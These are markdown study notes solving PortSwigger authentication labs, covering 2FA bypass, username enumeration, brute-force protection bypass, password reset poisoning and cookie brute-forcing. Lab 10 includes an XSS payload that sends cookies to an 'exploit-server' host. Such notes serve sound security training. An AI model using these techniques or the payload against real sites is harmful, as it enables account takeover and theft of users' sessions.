# Authentication

## Difference between Authentication and Authorization
**Authentication** is the process of verifying that a user is who they say they are.   
**Authorization** involves verifying that the user is authorized to do something.  
For example, authentication determines if the person trying to access a website under the username Carlos123 is indeed the same person who created the account.
Once Carlos123 is authenticated, his or her privileges determine what he or she is allowed to do.  
For example, you may be allowed to access personal information about other users or perform actions such as deleting another user's account.

## Type of Vulnerability
- Password-based login vulnerabilities  
- Multifactor authentication vulnerabilities  
- Vulnerability of other authentication mechanisms ( e.g. password reset, password change)  

### Labs Portswigger
Use [username list](https://portswigger.net/web-security/authentication/auth-lab-usernames) and [password list](https://portswigger.net/web-security/authentication/auth-lab-passwords).

#### 1. Simple User Enumeration

#### 2. Simple 2FA Bypass 
```
Just try to access the next endpoint directly (you need to know the path of the next endpoint) e.g. /my-account
If this doesnâ€™t work, try to change the Referrer header as if you came from the 2FA page 
```

#### 3. Password reset broken logic
```
Change username in POST request after password-reset link
temp-forgot-password-token=MgFMne17hOm2WM5BMHyVzvEewBFOwnyc&username=carlos&new-password-1=w&new-password-2=w
```

#### 4. User Enumeration with Different Responses
```
Just look at difference in responses
```

#### 5. User Enumeration with Different Response Time
```
Just look at difference in response time
Also for this lab you need to set X-Forwarded-For header to bypass login restrictions
```

#### 6. Broken brute-force protection, IP block
>You can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached. For example create a combined list with your valid credentials and with victim's creds:
```
wiener - peter
carlos - kek
carlos - kek2
wiener - peter
carlos - kek3 etc...
```

#### 7. Username enumeration via account lock
```
It blocks only existing accounts, so try to brute the same list of passwords until one of accounts from the list is not blocked.
To brute password use grep with errors to find a request without error
```

#### 8. 2FA broken logic
```
Observe there is verify=wiener in cookie while sending 2FA code
Change it to our victim's nickname and simply brute 2FA code
```

#### 9. Brute-forcing a stay-logged-in cookie
```
Observe stay logged in function. Check cookie and observe that it is base64 encoded version of USERNAME:(md5)PASSWORD
Create a list of md5 hashed passwords and brute cookies
```

#### 10. Offline password cracking
>Steal cookie in comment section via XSS: ```<script>document.write('<img src="https://exploit-server?c='+document.cookie+'" />');</script>```
>Crack MD5 hash via john the ripper or web services


#### 11. Password reset poisoning via middleware
```
While processing forgot password set new header:
X-Forwarded-Host: exploit-server 
It will process Host Header Injection
```

#### 12. Password brute-force via password change
```
While processing password changing, observe that you can change nickname.
Change it to victim's one and brute his password
```
